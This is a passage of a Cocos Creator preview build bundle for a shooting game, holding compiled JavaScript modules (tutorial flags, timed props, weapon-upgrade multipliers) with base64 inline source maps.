CAgIGxldCBmaXJlUG93ZXJMdiA9IFdvcmxkLk15LmFybW9yeS5sZXZlbE9mRW1pdHRlckZpcmVQb3dlcihpZCk7XHJcbiAgICAgICAgaWYgKGZpcmVQb3dlckx2ID49IFdvcmxkLlN0b3JhZ2UuQURMdil7XHJcbiAgICAgICAgICAgIFRvYXN0LmZsdXR0ZXIoe3N0cmluZzpcIjxjb2xvcj0jZmFmZmZmPjxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9ND7nrYnnuqfkuI3lvpfpq5jkuo7ln7rnoYDmiJjmlpflips8L291dGxpbmU+PC9iPjwvY29sb3I+XCIsIGZvbnRTaXplOjMwLCB5OmNjLnZpc2libGVSZWN0LmNlbnRlci55fSk7XHJcbiAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IG5lZWRDb3N0ID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uVXApW2ZpcmVQb3dlckx2LTFdWydmaXJlX2V4cGVuZCddO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50IC09IG5lZWRDb3N0O1xyXG4gICAgICAgIFdvcmxkLk15LmFybW9yeS5hZGRMZXZlbE9mRW1pdHRlckZpcmVQb3dlcihpZCwgMSk7XHJcbiAgICAgICAgdGhpcy51cGRhdGVGaXJlUG93ZXIoKTtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiV2VhcG9uVXBcIik7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1VwV2VhcG9uUG93ZXIoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFXZWFwb25MYXllckNvbnRyb2xsZXIgVXBXZWFwb25Qb3dlclwiKVxyXG5cclxuICAgICAgICBsZXQgY2ZnID0gdGhpcy5fb3JkZXJzW3RoaXMuX3dlYXBvbkZvY3VzXTtcclxuICAgICAgICBsZXQgaWQgPSBjZmdbJ2lkJ107XHJcbiAgICAgICAgbGV0IHBvd2VyTHYgPSBXb3JsZC5NeS5hcm1vcnkubGV2ZWxPZkVtaXR0ZXJQb3dlcihpZCk7XHJcbiAgICAgICAgaWYgKHBvd2VyTHYgPj0gV29ybGQuU3RvcmFnZS5BREx2KXtcclxuICAgICAgICAgICAgVG9hc3QuZmx1dHRlcih7c3RyaW5nOlwiPGNvbG9yPSNmYWZmZmY+PGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD00Puetiee6p+S4jeW+l+mrmOS6juWfuuehgOaImOaWl+WKmzwvb3V0bGluZT48L2I+PC9jb2xvcj5cIiwgZm9udFNpemU6MzAsIHk6Y2MudmlzaWJsZVJlY3QuY2VudGVyLnl9KTtcclxuICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgbmVlZENvc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcClbcG93ZXJMdi0xXVsncG93ZXJfZXhwZW5kJ107XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgLT0gbmVlZENvc3Q7XHJcbiAgICAgICAgV29ybGQuTXkuYXJtb3J5LmFkZExldmVsT2ZFbWl0dGVyUG93ZXIoaWQsIDEpO1xyXG4gICAgICAgIHRoaXMudXBkYXRlUG93ZXIoKTtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiV2VhcG9uVXBcIik7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1RvZ2dsZSh0b2dnbGUsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFXZWFwb25MYXllckNvbnRyb2xsZXIgVG9nZ2xlXCIpXHJcblxyXG4gICAgICAgIGlmICh0b2dnbGUuaXNDaGVja2VkKXtcclxuICAgICAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UudW5sb2NrR3VuID4gMCl7XHJcbiAgICAgICAgICAgICAgICAvKiog5YiH5o2iZm9jdXMgKi9cclxuICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IHRoaXMuX29yZGVycy5maW5kSW5kZXgodmFsdWUgPT4gdmFsdWVbJ2lkJ10gPT0gV29ybGQuU3RvcmFnZS51bmxvY2tHdW4pO1xyXG4gICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJpbmRleD09PT5cIiwgaW5kZXgpO1xyXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBpbmRleCA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKFwibm90IGZvdW5kIGd1biBmb3IgaWQ9PT0+XCIsIFdvcmxkLlN0b3JhZ2UudW5sb2NrR3VuKTtcclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy53ZWFwb25Gb2N1cyA9IGluZGV4O1xyXG4gICAgICAgICAgICAgICAgICAgIC8qKiDmkq3mlL7mtYHlhYnliqjnlLsgKi9cclxuICAgICAgICAgICAgICAgICAgICB0aGlzLndlYXBvbkJ1dHRvbnNbaW5kZXhdLm5vZGUuZ2V0Q2hpbGRCeU5hbWUoXCJCYWNrZ3JvdW5kXCIpLmdldENoaWxkQnlOYW1lKFwid2VhcG9uU3ByaXRlXCIpLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMud2VhcG9uQnV0dG9uc1tpbmRleF0ubm9kZS5nZXRDaGlsZEJ5TmFtZShcIkJhY2tncm91bmRcIikuZ2V0Q2hpbGRCeU5hbWUoXCJ3ZWFwb25cIikuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLndlYXBvbkJ1dHRvbnNbaW5kZXhdLm5vZGUuZ2V0Q2hpbGRCeU5hbWUoXCJCYWNrZ3JvdW5kXCIpLmdldENoaWxkQnlOYW1lKFwid2VhcG9uXCIpLmdldENvbXBvbmVudChzcC5Ta2VsZXRvbikuc2V0QW5pbWF0aW9uKDAsIFwiZ3VuXzAwMlwiLCB0cnVlKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/Newbies.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '21af4u3ilxCeqEbsCgLln+k', 'Newbies');
// script/app/info/Newbies.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("./World");
var Newbies = /** @class */ (function () {
    function Newbies(map) {
        this._map = null;
        this._map = map;
    }
    Newbies.prototype.state = function (key) {
        var val = this._map[key];
        return !!val;
    };
    Newbies.prototype.finish = function (key) {
        this._map[key] = 1;
        World_1.World.Storage.newbies = this.toJson();
    };
    Newbies.prototype.toJson = function () {
        return JSON.stringify(this._map);
    };
    return Newbies;
}());
exports.default = Newbies;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vTmV3Ymllcy50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaUNBQThCO0FBRTlCO0lBQ0ksaUJBQVksR0FBRztRQUdQLFNBQUksR0FBb0IsSUFBSSxDQUFDO1FBRmpDLElBQUksQ0FBQyxJQUFJLEdBQUcsR0FBRyxDQUFDO0lBQ3BCLENBQUM7SUFHRCx1QkFBSyxHQUFMLFVBQU0sR0FBVTtRQUNaLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUM7UUFDekIsT0FBTyxDQUFDLENBQUMsR0FBRyxDQUFDO0lBQ2pCLENBQUM7SUFFRCx3QkFBTSxHQUFOLFVBQU8sR0FBVTtRQUNiLElBQUksQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLEdBQUksQ0FBQyxDQUFDO1FBQ3BCLGFBQUssQ0FBQyxPQUFPLENBQUMsT0FBTyxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsQ0FBQztJQUMxQyxDQUFDO0lBRUQsd0JBQU0sR0FBTjtRQUNJLE9BQU8sSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7SUFDckMsQ0FBQztJQUNMLGNBQUM7QUFBRCxDQW5CQSxBQW1CQyxJQUFBIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuL1dvcmxkXCI7XHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBOZXdiaWVze1xyXG4gICAgY29uc3RydWN0b3IobWFwKXtcclxuICAgICAgICB0aGlzLl9tYXAgPSBtYXA7XHJcbiAgICB9XHJcbiAgICBwcml2YXRlIF9tYXA6W3N0cmluZywgbnVtYmVyXSA9IG51bGw7XHJcblxyXG4gICAgc3RhdGUoa2V5OnN0cmluZyk6Ym9vbGVhbntcclxuICAgICAgICBsZXQgdmFsID0gdGhpcy5fbWFwW2tleV07XHJcbiAgICAgICAgcmV0dXJuICEhdmFsO1xyXG4gICAgfVxyXG5cclxuICAgIGZpbmlzaChrZXk6c3RyaW5nKXtcclxuICAgICAgICB0aGlzLl9tYXBba2V5XSA9ICAxO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UubmV3YmllcyA9IHRoaXMudG9Kc29uKCk7XHJcbiAgICB9XHJcblxyXG4gICAgdG9Kc29uKCl7XHJcbiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHRoaXMuX21hcCk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/PropInfo.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '3fd2b3Z2YFPp7jX7jvk4yqf', 'PropInfo');
// script/app/info/PropInfo.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("./World");
var PropInfo = /** @class */ (function () {
    function PropInfo(map) {
        this._map = null;
        this._map = map;
    }
    /** 过期时间 */
    PropInfo.prototype.expireTime = function (id) {
        return this._map[id];
    };
    /** 是否在使用中 */
    PropInfo.prototype.beUsing = function (id) {
        return this._map[id] && this._map[id] > new Date().getTime();
    };
    /** 使用 */
    PropInfo.prototype.use = function (id) {
        this._map[id] = new Date().getTime() + 60 * 60 * 1000;
        World_1.World.Storage.props = this.toJson();
    };
    PropInfo.prototype.toJson = function () {
        return JSON.stringify(this._map);
    };
    return PropInfo;
}());
exports.default = PropInfo;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vUHJvcEluZm8udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLGlDQUE4QjtBQUU5QjtJQUNJLGtCQUFZLEdBQUc7UUFJUCxTQUFJLEdBQXVCLElBQUksQ0FBQztRQUhwQyxJQUFJLENBQUMsSUFBSSxHQUFHLEdBQUcsQ0FBQztJQUNwQixDQUFDO0lBSUQsV0FBVztJQUNYLDZCQUFVLEdBQVYsVUFBVyxFQUFTO1FBQ2hCLE9BQU8sSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsQ0FBQztJQUN6QixDQUFDO0lBRUQsYUFBYTtJQUNiLDBCQUFPLEdBQVAsVUFBUSxFQUFTO1FBQ2QsT0FBTyxJQUFJLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxJQUFJLElBQUksQ0FBQyxJQUFJLENBQUMsRUFBRSxDQUFDLEdBQUcsSUFBSSxJQUFJLEVBQUUsQ0FBQyxPQUFPLEVBQUUsQ0FBQztJQUNoRSxDQUFDO0lBRUQsU0FBUztJQUNULHNCQUFHLEdBQUgsVUFBSSxFQUFTO1FBQ1QsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxJQUFJLElBQUksRUFBRSxDQUFDLE9BQU8sRUFBRSxHQUFHLEVBQUUsR0FBQyxFQUFFLEdBQUMsSUFBSSxDQUFDO1FBQ2xELGFBQUssQ0FBQyxPQUFPLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsQ0FBQztJQUN4QyxDQUFDO0lBRUQseUJBQU0sR0FBTjtRQUNJLE9BQU8sSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7SUFDckMsQ0FBQztJQUNMLGVBQUM7QUFBRCxDQTFCQSxBQTBCQyxJQUFBIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuL1dvcmxkXCI7XHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBQcm9wSW5mb3tcclxuICAgIGNvbnN0cnVjdG9yKG1hcCl7XHJcbiAgICAgICAgdGhpcy5fbWFwID0gbWFwO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgX21hcDpNYXA8bnVtYmVyLCBudW1iZXI+ID0gbnVsbDtcclxuXHJcbiAgICAvKiog6L+H5pyf5pe26Ze0ICovXHJcbiAgICBleHBpcmVUaW1lKGlkOm51bWJlcil7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX21hcFtpZF07XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaYr+WQpuWcqOS9v+eUqOS4rSAqL1xyXG4gICAgYmVVc2luZyhpZDpudW1iZXIpOmJvb2xlYW57XHJcbiAgICAgICByZXR1cm4gdGhpcy5fbWFwW2lkXSAmJiB0aGlzLl9tYXBbaWRdID4gbmV3IERhdGUoKS5nZXRUaW1lKCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOS9v+eUqCAqL1xyXG4gICAgdXNlKGlkOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5fbWFwW2lkXSA9IG5ldyBEYXRlKCkuZ2V0VGltZSgpICsgNjAqNjAqMTAwMDtcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLnByb3BzID0gdGhpcy50b0pzb24oKTtcclxuICAgIH1cclxuXHJcbiAgICB0b0pzb24oKXtcclxuICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkodGhpcy5fbWFwKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/Armory.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'd4529RQIIBPsYekmld/nMb5', 'Armory');
// script/app/info/Armory.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("./World");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var EMITTER_POWER_LEVEL = "powerLv";
var EMITTER_FIRE_POWER_LEVEL = "firePowerLv";
// const POWER_MULS = [1,2,2,4,2,4,6,6,6,6,6];
var PAYLOAD_MULS = [1, 1, 10, 2, 5, 10, 1, 1, 1, 1, 1];
/** 试用加50级 */
var TRIAL_ADD = 50;
/** 武器库 */
var Armory = /** @class */ (function () {
    function Armory(map) {
        this._map = null;
        this._weaponUpCfg = null;
        this._bulletUpCfg = null;
        this._map = map;
        this._weaponUpCfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.WeaponUp);
        this._bulletUpCfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.BulletUp);
    }
    /** 伤害加成 */
    Armory.prototype.hurtMulOf = function (emitter) {
        var baseMul = this._weaponUpCfg[World_1.World.Storage.ADLv - 1]['fight'];
        if (emitter == 1) {
            return baseMul;
        }
        var lv = this.levelOfEmitterPower(emitter);
        if (emitter == World_1.World.Storage.unlockGun) {
            lv += TRIAL_ADD;
            if (lv > this._weaponUpCfg.length) {
                lv = this._weaponUpCfg.length;
            }
        }
        return this._weaponUpCfg[lv - 1]['hurt_add'] * baseMul;
    };
    /** 弹容量累加 */
    Armory.prototype.payloadAddOf = function (emitter) {
        if (emitter == 1)
            return 0;
        var lv = this.levelOfEmitterFirePower(emitter);
        if (emitter == World_1.World.Storage.unlockGun) {
            lv += TRIAL_ADD;
            if (lv > this._weaponUpCfg.length) {
                lv = this._weaponUpCfg.length;
            }
        }
        return this._bulletUpCfg[lv - 1]["gun_" + ("000" + emitter).substr(-3)];
    };
    /** 发射频率加成 */
    Armory.prototype.freMulOf = function (emitter) {
        var index = 0;
        if (emitter == 1) {
            index = World_1.World.Storage.ADLv - 1;
        }
        else {
            var lv = this.levelOfEmitterFirePower(emitter);
            if (emitter == World_1.World.Storage.unlockGun) {
                lv += TRIAL_ADD;
                if (lv > this._weaponUpCfg.length) {
                    lv = this._weaponUpCfg.length;
                }
            }
            index = lv - 1;
        }
        return this._weaponUpCfg[index]['fre'];
    };
    /** 射程加成 */
    Armory.prototype.rangeMulOf = function (emitter) {
        if (emitter == 4 || emitter == 5) {
            var lv = this.levelOfEmitterPower(emitter);
            if (emitter == World_1.World.Storage.unlockGun) {
                lv += TRIAL_ADD;
                if (lv > this._weaponUpCfg.length) {
                    lv = this._weaponUpCfg.length;
                }
            }
            return this._weaponUpCfg[lv - 1]['range_add'];
        }
        else {
            return 1;
        }
    };
    /** 放大加成 */
    Armory.prototype.magnifyMul = function (emitter) {
        if (emitter == 2 || emitter == 9 || emitter == 10) {
            var lv = this.levelOfEmitterPower(emitter);
            if (emitter == World_1.World.Storage.unlockGun) {
                lv += TRIAL_ADD;
                if (lv > this._weaponUpCfg.length) {
                    lv = this._weaponUpCfg.length;
                }
            }
            return this._weaponUpCfg[lv - 1]['amp_add'];
        }
        else {
            return 1;
        }
    };
    /** 获取武器的威力加成 */
    Armory.prototype.levelOfEmitterPower = function (emitter) {
        var data = this._map[emitter];
        if (data) {
            return data[EMITTER_POWER_LEVEL];
        }
        else {
            return 1;
        }
    };
    /** 获取武器的火力加成 */
    Armory.prototype.levelOfEmitterFirePower = function (emitter) {
        var data = this._map[emitter];
        if (data) {
            return data[EMITTER_FIRE_POWER_LEVEL];
        }
        else {
            return 1;
        }
    };
    Armory.prototype.addLevelOfEmitterPower = function (emitter, add) {
        var data = this._map[emitter];
        if (!data) {
            data = {};
            data[EMITTER_POWER_LEVEL] = 1;
            data[EMITTER_FIRE_POWER_LEVEL] = 1;
            this._map[emitter] = data;
        }
        data[EMITTER_POWER_LEVEL] = data[EMITTER_POWER_LEVEL] + add;
        World_1.World.Storage.armory = this.toJson();
    };
    Armory.prototype.addLevelOfEmitterFirePower = function (emitter, add) {
        var data = this._map[emitter];
        if (!data) {
            data = {};
            data[EMITTER_POWER_LEVEL] = 1;
            data[EMITTER_FIRE_POWER_LEVEL] = 1;
            this._map[emitter] = data;
        }
        data[EMITTER_FIRE_POWER_LEVEL] = data[EMITTER_FIRE_POWER_LEVEL] + add;
        World_1.World.Storage.armory = this.toJson();
    };
    Armory.prototype.toJson = function () {
        return JSON.stringify(this._map);
    };
    return Armory;
}());
exports.default = Armory;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vQXJtb3J5LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxpQ0FBOEI7QUFDOUIscUVBQWtFO0FBQ2xFLDZEQUEwRDtBQUUxRCxJQUFNLG1CQUFtQixHQUFHLFNBQVMsQ0FBQztBQUN0QyxJQUFNLHdCQUF3QixHQUFHLGFBQWEsQ0FBQztBQUUvQyw4Q0FBOEM7QUFDOUMsSUFBTSxZQUFZLEdBQUcsQ0FBQyxDQUFDLEVBQUMsQ0FBQyxFQUFDLEVBQUUsRUFBQyxDQUFDLEVBQUMsQ0FBQyxFQUFDLEVBQUUsRUFBQyxDQUFDLEVBQUMsQ0FBQyxFQUFDLENBQUMsRUFBQyxDQUFDLEVBQUMsQ0FBQyxDQUFDLENBQUM7QUFFL0MsYUFBYTtBQUNiLElBQU0sU0FBUyxHQUFHLEVBQUUsQ0FBQztBQUVyQixVQUFVO0FBQ1Y7SUFFSSxnQkFBWSxHQUFHO1FBTVAsU0FBSSxHQUFvQixJQUFJLENBQUM7UUFDN0IsaUJBQVksR0FBTyxJQUFJLENBQUM7UUFDeEIsaUJBQVksR0FBTyxJQUFJLENBQUM7UUFQNUIsSUFBSSxDQUFDLElBQUksR0FBRyxHQUFHLENBQUM7UUFDaEIsSUFBSSxDQUFDLFlBQVksR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ3hFLElBQUksQ0FBQyxZQUFZLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxRQUFRLENBQUMsQ0FBQztJQUM1RSxDQUFDO0lBT0QsV0FBVztJQUNYLDBCQUFTLEdBQVQsVUFBVSxPQUFjO1FBQ3BCLElBQUksT0FBTyxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsYUFBSyxDQUFDLE9BQU8sQ0FBQyxJQUFJLEdBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDL0QsSUFBSSxPQUFPLElBQUksQ0FBQyxFQUFDO1lBQ2IsT0FBTyxPQUFPLENBQUM7U0FDbEI7UUFD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